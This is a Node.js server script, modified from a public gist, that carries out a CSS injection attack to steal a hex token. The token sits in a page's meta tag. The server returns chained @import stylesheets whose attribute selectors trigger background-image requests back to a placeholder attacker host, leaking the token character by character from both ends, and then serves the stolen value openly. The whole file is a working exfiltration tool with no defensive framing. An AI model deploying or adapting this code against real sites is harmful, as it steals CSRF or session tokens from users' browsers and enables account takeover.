//got this script from https://gist.github.com/cgvwzq/6260f0f0a47c009c87b4d46ce3808231 and modified it
const https = require('https');
const fs = require('fs');
const url = require('url');
const port = 8080;

const HOSTNAME = "https://HOST:PORT";
const DEBUG = true;

var prefix = "", postfix = "";
var pending = [];
var stop = false, ready = 0, n = 0;
var tokenLen = 0;
var token = "";

const requestHandler = (request, response) => {
    let req = url.parse(request.url, url);
    tokenLen = Number(req.query.len);
    log('\treq: %s', request.url);
    if (stop) return response.end();
    switch (req.pathname) {
        case "/start":
            genResponse(response);
            break;
        case "/leak":
            response.end();
            if (req.query.pre && prefix !== req.query.pre) {
                prefix = req.query.pre;
            } else if (req.query.post && postfix !== req.query.post) {
               postfix = req.query.post;
            } else {
                break;
            }
            if (ready == 2) {
                genResponse(pending.shift());
                ready = 0;
            } else {
                ready++;
                log('\tleak: waiting others...');
            }
            break;
        case "/next":
            if (ready == 2) {
                genResponse(response);
                ready = 0;
            } else {
                pending.push(response);
                ready++;
                log('\tquery: waiting others...');
            }
            break;
        case "/end":
            stop = true;
            token = req.query.token;
        case "/result":
            function check() {
                 if(token.length == 0) {
                     return setTimeout(check, 100);
                 }
                 console.log('[+] END: %s', token);
                 response.setHeader('Content-Type', 'text/plain');
                 response.setHeader('Cache-Control', 'no-cache');
                 response.setHeader('Access-Control-Allow-Origin', '*');
                 response.write(token);
                 response.end();
            }
            check();
    }
}
const genResponse = (response) => {
    console.log('...pre-payoad: ' + prefix);
    console.log('...post-payoad: ' + postfix);
    console.log(prefix.length);
    let css;
    if (prefix.length !== tokenLen-1) {
        css = '@import url('+ HOSTNAME + '/next?len=' + tokenLen + '&'+Math.random() + ');' +
                'head, meta {display: block;} '+
                [0,1,2,3,4,5,6,7,8,9,'a','b','c','d','e','f'].map(e => ('meta'+ ('[content$="' + e + postfix + '"]').repeat(n+1) +'{background:url(' + HOSTNAME + '/leak?len='+tokenLen+'&post=' + e + postfix + ')}')).join('') +
                [0,1,2,3,4,5,6,7,8,9,'a','b','c','d','e','f'].map(e => ('meta'+ ('[content^="' + prefix + e + '"]').repeat(n+1) + '{border-image:url(' + HOSTNAME + '/leak?len='+tokenLen+'&pre=' + prefix + e +')}')).join('');
    }
    else {
        css = '@import url(' + HOSTNAME + '/end?len='+tokenLen+'&token=' + postfix + '&);';
    }
    response.writeHead(200, { 'Content-Type': 'text/css'});
    response.write(css);
    response.end();
    n++;
}
const options = {
  key: fs.readFileSync('key.pem'),
  cert: fs.readFileSync('cert.pem')
};

const server = https.createServer(options, requestHandler);

server.listen(port, (err) => {
    if (err) {
        return console.log('[-] Error: something bad happened', err);
    }
    console.log('[+] Server is listening on %d', port);
})

function log() {
    if (DEBUG) console.log.apply(console, arguments);
}